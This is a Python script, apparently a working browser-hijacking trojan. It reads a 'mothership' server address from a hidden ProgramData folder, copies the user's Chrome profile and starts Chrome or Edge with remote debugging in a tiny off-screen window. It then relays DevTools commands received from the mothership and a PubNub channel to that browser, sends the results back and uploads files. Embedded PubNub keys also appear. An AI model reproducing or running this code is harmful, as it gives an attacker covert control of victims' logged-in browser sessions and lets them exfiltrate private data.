# https://onecompiler.com/python#draft-acs9
# 20260607-1336

# https://onecompiler.com/python/44me4y8rn

# clear ; & "E:\__Binaries\Portable Python-3.10.5 x64\App\Python\python.exe" test.py
# "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" 
# --profile-directory=Default --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session
# chrome.exe --remote-debugging-port=9222 --remote-allow-origins=* --profile-directory=Default --restore-last-session
# use 9223 for chrome, 9222 for msedge

# robocopy "C:\Users\sebas\AppData\Local\Google\Chrome\User Data" C:\ProgramData\owd\chrome /E /R:0 /W:0
# "C:\Program Files\Google\Chrome\Application\chrome.exe" --user-data-dir="C:\ProgramData\owd\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --ignore-certificate-errors --remote-debugging-port=9223
# taskkill /F /IM chrome.exe
# curl -v -G http://localhost:9223/json

# python -m pip install psutil
# python -m pip install pubnub

# http://localhost:9222/json/list
# http://localhost:9223/json/list

# curl -s http://localhost:9222/json/list | findstr webSocketDebuggerUrl | findstr ws://

from datetime import datetime
import time
from pubnub.pubnub import PubNub
from pubnub.pnconfiguration import PNConfiguration
from pubnub.pubnub import PubNub
from pubnub.callbacks import SubscribeCallback
from pubnub.enums import PNStatusCategory

import traceback
import psutil
import inspect
import time
import sys
import websocket
import json
import requests
import tempfile
import os
from pathlib import Path
from datetime import datetime
import random
from urllib.parse import quote

def isempty(instr):
    return not (instr and instr.strip())

def gettimestamp():
    now = datetime.now()
    timestamp = now.strftime('%Y%m%d%H%M%S%f')[:-3]

    return timestamp

def getexceptionobj(exp):
    expstrdict = {
        "msg": str(exp),
        "tech_msg": repr(exp),
        "full_trace": traceback.format_exc()
    }
    
    return expstrdict
    
def logexception(exp):
    if ( not exp ):
        return
        
    expstrdict = getexceptionobj(exp)

    logmsg(json.dumps(expstrdict))

def logmsg(msgstr):
    print(msgstr)

    if( logf ):
        logf.write(f"{msgstr}\r\n")
        logf.flush()  

def get_clientid():
    clientid_file = os.path.join(trojandir, 'client_id')
    tclientid=""

    with open(clientid_file, 'r') as f:
        tclientid = f.read().strip()

    return tclientid

def get_mothership():
    tmothershipfpath = os.path.join(trojandir, 'mothership')
    tmothership=""

    with open(tmothershipfpath, 'r') as f:
        tmothership = f.read().strip()

    return tmothership

def connect_client(tclientid):
    try:
        url = f"{mothership}/ow/relay.php?action=connectclient&clientid={tclientid}"
        response = requests.get(url)
        
        #{ "SessionID": "67363438" }
        
        if ( response ):
            if ( not isempty(response.text) ):
                logmsg(f"response.text: {response.text}")
                
                obj_dict = json.loads(response.text)
            
                if obj_dict and "SessionID" in obj_dict:
                    return obj_dict["SessionID"]
            else:
                logmsg("error: response.text is empty")
                return None
        else:
            logmsg("error: response is null")
            return None
    except Exception as exp:
        logexception(exp)
        return None
        
def send_rpc_command(url, command, log=True):
    result = None
    try:
        logmsg("sending to: "+url)
        # Create WebSocket connection
        ws = websocket.create_connection(url)
        logmsg("Connected...")

        # Send command
        ws.send(json.dumps(command))
        logmsg(f"Sent: {json.dumps(command)}")

        # Receive response
        result = ws.recv()

        if ( log ):
            logmsg(f"Received response: {result}")
        else:
            logmsg(f"Received response")

        # Close connection
        ws.close()
    except Exception as e:
        logmsg(f"Error: {e}")

    return result 

def upload_file(filepath):
    logmsg(f"uploading file: {filepath}".replace("\\", "\\\\"))

    fpath = Path(filepath).resolve()
    fname = Path(filepath).name

    url = f"{mothership}/ow/upload.php?"
    url += f"batchid={batchid}"
    url += f"&filename={fname}"
    url += f"&clientid={clientid}"
    url += f"&source={source}"
    url += f"&sessionid={sessionid}"
    with open(fpath, 'rb') as f:
        response = requests.post(url, data=f)

    return response

def upload_txt(txtstr, fname):
    ts = gettimestamp()
    fpath = os.path.join(scriptdir_full_path, fname)

    with open(fpath, 'w', encoding='utf-8') as f:
        f.write(txtstr)

    if ( os.path.exists(fpath) ):
        upload_file(fpath)

def clientgetnextmessage():
    logmsg("starting: " + inspect.currentframe().f_code.co_name)

    url = f"{mothership}/ow/relay.php?"
    url += "action=clientgetnextmessage"
    url += f"&sessionid={relaysessionid}&clientid={clientid}"
    
    response = requests.get(url)
    logmsg("response.status_code: " + str(response.status_code))  # e.g., 200 for success

    logmsg(inspect.currentframe().f_code.co_name + ": " +response.text)

    if "TRY_AGAIN" in response.text:
        return response.text

    obj_dict = json.loads(response.text)

    return obj_dict

def clientpushmessage(payload, messageid):
    logmsg("starting "+inspect.currentframe().f_code.co_name)

    if not payload:
        return None
    
    #msgstr = json.dumps(payload)

    #url = f"{mothership}/ow/relay.php?"
    #url += f"action=clientpushmessage"
    #url += f"&clientid={clientid}&sessionid={relaysessionid}&messageid={messageid}"
    
    #response = requests.post(url, data=msgstr.encode('utf-8'), headers={'Content-Type': 'application/json'})
    return publish_msg(payload, messageid)
    #return response

def wait_clientgetnextmessage(secs=1):
    result = None
    while True:
        result = clientgetnextmessage()
        msg_str = ""
        if ( isinstance(result, str) ):
            msg_str = result.strip()

            if ( msg_str== "TRY_AGAIN" ):
                result = None
                logmsg(inspect.currentframe().f_code.co_name + " sleeping for " + str(secs) + " seconds")
                time.sleep(secs)
        else:
            break

    return result

def exec_builtin(tcmdname):
    
    if ( isempty(tcmdname) ):
        return None
    
    tcmdname = tcmdname.lower()

    if ( tcmdname == "start_msedge" ):
        try:
            result = start_msedge()
        except Exception as exp:
            logexception(exp)
            result = None
    elif ( tcmdname == "get_targets_list"):
        try:
            result = get_targets_list()
        except Exception as exp:
            logexception(exp)
            result = None

    result = { "result": result }

    return json.dumps(result)

def client_loop(message):
    logmsg("client_loop: starting "+inspect.currentframe().f_code.co_name)

    message_obj = message
    messageid = message_obj["MessageID"]
    payload =   message_obj["payload"]
    
    builtincmd = ""
    
    if ( "builtincmd" in message_obj ):
        builtincmd = message_obj["builtincmd"]

        logmsg(f"client_loop: processing builtincmd {builtincmd}")
        
        if ( not isempty(builtincmd) ):
            result = exec_builtin(builtincmd)
            
    else:
    
        if not "ws_url" in message_obj:
            logmsg("ws_url not in message_obj")
            return

        if not "payload" in message_obj:
            logmsg("payload key not in message_obj")
            return
            
        ws_url = message_obj["ws_url"]
        
        payload = message_obj["payload"]

        logmsg(f"ws_url: {ws_url}")
        logmsg(f"payload: {payload}")

        if ( ws_url == "ws_url" ):
            ws_url = relay_ws_url

        result = send_rpc_command(ws_url, payload,True)
    
    if ( result ):
        data_dict = json.loads(result)
        result = data_dict["result"]
        
        if ( result == {} ):
            result = { "isvoid": True }

        if ( not result ):
            result = { "iserror": True }
            
        result = clientpushmessage(result, messageid)

def get_relay_ws_url(debugport=9222):
    pp = inspect.currentframe().f_code.co_name
    
    logmsg(f"{pp}: debugport: {debugport}")

    try:
        url="http://localhost:"+str(debugport)+"/json/version"
        logmsg(f"{pp}: HTTP GET {url}" )
        response = requests.get(url)
        
        if ( not response ):
            raise Exception("response is null")
            
        logmsg("response.status_code: " + str(response.status_code))  # e.g., 200 for success
        
        data_dict = response.json()
        
        trelay_ws_url = ""
        
        if isinstance(data_dict, dict) and "webSocketDebuggerUrl" in data_dict:
            trelay_ws_url = data_dict["webSocketDebuggerUrl"]
        else:
            raise Exception("ERROR: was not able to access webSocketDebuggerUrl in result")
                
        logmsg(f"relay_ws_url: {trelay_ws_url}")
            
        return trelay_ws_url
        
    except Exception as exp:
        logexception(exp)
        return None

def get_targets_list(port=9222):
    response = requests.get("http://localhost:"+str(port)+"/json/list")
    targets_list = response.json()
    return targets_list

def start_chrome(starturl="https://www.google.com/", chromeport=9223):
    cmdlineargs = '--new-window '+starturl + ' --user-data-dir="C:\ProgramData\owd\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --ignore-certificate-errors --remote-debugging-port=' + str(chromeport) + '--window-position=2000,2000 --window-size=10,10'
    os.system("start /min chrome " + cmdlineargs)
    
def start_msedge(starturl="https://www.google.com/", edgeport=9222):
    cmdlineargs = '--new-window '+starturl+' --profile-directory=Default --remote-debugging-port='+str(edgeport)+' --remote-allow-origins=* --restore-last-session --window-position=2000,2000 --window-size=10,10'
    os.system("start /min msedge " + cmdlineargs)

### 

delaytime = 3

debugport = 9223
if ( len(sys.argv) >= 2 ):
    debugport = sys.argv[1]
    if ( not isempty(debugport) ):
        debugport = int(debugport)

timestamp = gettimestamp()
script_full_path = Path(__file__).resolve()
script_fname = Path(__file__).name
source = script_fname
scriptdir_full_path = script_full_path.parent

# temp_dir = "C:\\ProgramData\\owdtpl" # tempfile.gettempdir()
trojandir = "C:\\ProgramData\\owd" # temp_dir # os.path.join(temp_dir, "owd") 

logfname = script_fname + "_" + timestamp + ".log"
logfpath = os.path.join(scriptdir_full_path, logfname)
logf = open(logfpath, 'w', encoding='utf-8')

batchid = str(random.randint(10000000, 99999999))
clientid = get_clientid()

mothership = get_mothership()

if ( isempty(mothership) ):
    logmsg("could not set mothership -- exiting")
    sys.exit(1)

if ( isempty(clientid) ):
    logmsg("could not set clientid -- exiting")
    sys.exit(1)

logmsg(f"starting script {script_fname} clientid {clientid} batchid {batchid} debugport {debugport} -- args: " + ' '.join(sys.argv[1:]) + f" -- {timestamp}")

relay_ws_url=get_relay_ws_url(debugport)

if ( isempty(relay_ws_url) ):
    logmsg("could not set relay_ws_url -- exiting")
    sys.exit(1)

###

config = PNConfiguration()
config.publish_key = "pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc"
config.subscribe_key = "sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd"
config.uuid = f"clientid_{clientid}"

pubnub = PubNub(config)
mothership_channel = f"clientid_{clientid}_PYTHON_mothership"
client_channel = f"clientid_{clientid}_PYTHON_client"

subscription = pubnub.channel(client_channel).subscription()

###

logmsg(f"pubnub: mothership_channel: {mothership_channel} client_channel: {client_channel}")

def publish_callback(result, status):
    if not status.is_error():
        logmsg(f"pubnub: Message published with timetoken: {result.timetoken}")
    else:
        logmsg(f"pubnub: Publish failed with status: {status.category}")

def publish_msg(msgdict, messageid):

    if not msgdict:
        return
    
    msgobjout = {}
    msgobjout["payload"] = msgdict
    msgobjout["MessageID"] = messageid

    logmsg(f"pubnub: publishing message on {mothership_channel} -- messageid {messageid} msgdict {msgdict}")
    result = pubnub.publish().channel(mothership_channel).message(msgobjout).pn_async(publish_callback)
    return result

# pubnub.publish().channel(mothership_channel).message(my_message).pn_async(publish_callback)

def handle_message(message_event):
    pp = inspect.currentframe().f_code.co_name

    if not message_event:
        return;

    logmsg(f"pubnub: {pp} received message_event on channel [{message_event.channel}]: {message_event.message}")

    return client_loop(message_event.message)
    
    my_message = {
        "event": "sensor_update",
        "device_id": "sensor_01",
        "temperature": 22.5,
        "status": "active",
        "ts": datetime.now().strftime('%Y%m%d%H%M%S%f')[:-3]
    }

    logmsg("publishing response")

    pubnub.publish().channel(mothership_channel).message(my_message).pn_async(publish_callback)
    
    time.sleep(3)

subscription.on_message = handle_message

subscription.subscribe()

logmsg(f"pubnub: Successfully connected. Listening for events on: {client_channel}, sending messages on {mothership_channel}")

###

if __name__ == "__main__":
    while True:
        try:
            logmsg("starting relay loop " + gettimestamp())
            
            time.sleep(1)  

            logmsg(f"relay loop sleeping for {delaytime} seconds -- " + gettimestamp())
            
            time.sleep(delaytime)  

        except Exception as exp:
            logexception(exp)